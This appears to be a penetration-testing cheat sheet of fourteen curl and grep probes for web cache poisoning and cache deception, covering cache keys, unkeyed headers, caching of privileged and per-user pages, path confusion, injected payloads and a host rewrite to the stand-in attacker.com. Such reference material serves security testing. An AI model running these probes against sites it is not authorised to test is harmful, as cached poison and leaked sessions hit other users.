# Probe dictionary — every probe, in one corpus

The complete set of probes — the cache, the key, the unkeyed input, the confirm.

---

## 1. The cache-status probe — does a cache exist

```bash
curl -sI "$BASE/" | grep -iE 'x-cache|cf-cache|age:|via:|x-varnish|x-served-by|server'
#   X-Cache-Status: HIT/MISS — nginx; CF-Cache-Status — Cloudflare
```

## 2. The Vary probe — what's keyed

```bash
curl -sI "$BASE/" | grep -i 'vary'
#   Vary: Cookie → keyed on the cookie; (no Vary) → the headers unkeyed
```

## 3. The key-source probe — the configured key

```bash
grep -rnoiE 'proxy_cache_key|cache_key|vcl_hash|hash_data|make_cache_key|Vary' <src> | head -10
#   $uri → the params unkeyed; $request_uri → the params keyed
```

## 4. The unkeyed-input probe — the poisoning request

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # store it
curl "$BASE/page?cb=<unique>"   # a clean request — does it reflect <marker>?
```

## 5. The unkeyed-input sweep — the poisoning vector

```bash
for h in 'X-Forwarded-Host' 'X-Original-URL' 'User-Agent' 'Referer' 'Accept-Language' 'Accept-Charset' 'X-Forwarded-Scheme' 'X-Host' 'X-Real-IP' 'X-HTTP-Method-Override' 'X-Forwarded-Proto' 'X-Forwarded-Server'; do
  curl "$BASE/page?cb=<unique>" -H "$h: <marker>"
  curl "$BASE/page?cb=<unique>" | grep '<marker>' && echo "$h UNKEYED"
done
```

## 6. The cachebuster probe — a unique keyed param per probe

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # stored under /page?cb=<unique>
curl "$BASE/page?cb=<unique>"   # the stored copy serves it
curl "$BASE/page?cb=<other>"    # a different key — the clean copy
```

## 7. The deception probe — the privileged-page check

```bash
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'   # stores the privileged copy
curl "$BASE/settings.html?cb=<unique>"   # the privileged page → deception
```

## 8. The personalized-page probe — the per-user leak

```bash
curl "$BASE/profile?cb=<unique>" -H 'Cookie: <auth>'   # stores the personalized copy
curl "$BASE/profile?cb=<unique>"   # YOUR session's content → a per-user leak
```

## 9. The path-confusion probe — a normalization boundary

```bash
curl "$BASE/static/../admin?cb=<unique>"   # the cache stores it under the static key
curl "$BASE/static/../admin?cb=<unique>"   # the stored copy's response is the app's
```

## 10. The HIT/MISS probe — the stored-copy confirm

```bash
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'x-cache|cf-cache|age'
#   X-Cache-Status: HIT → the stored copy served it
```

## 11. The TTL probe — the deception's persistence

```bash
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'cache-control|age:|expires|max-age'
#   Age: 30 + max-age=300 → the copy is 30s old — 270s remain
```

## 12. The injected-content probe — the payload's store

```bash
curl "$BASE/page?cb=<unique>" -H 'User-Agent: <payload>'   # stores it
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # the stored copy carries it
```

## 13. The host-rewrite probe — the URL-rewrite

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page?cb=<unique>" | grep 'attacker.com'   # the stored copy's links carry it
```

## 14. The falsifier probe — the keyed-input check

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # store it
curl "$BASE/page?cb=<unique>"   # a clean request — does it reflect <marker>?
#   reflected → unkeyed → poisonable; NOT reflected → keyed → a different class
```
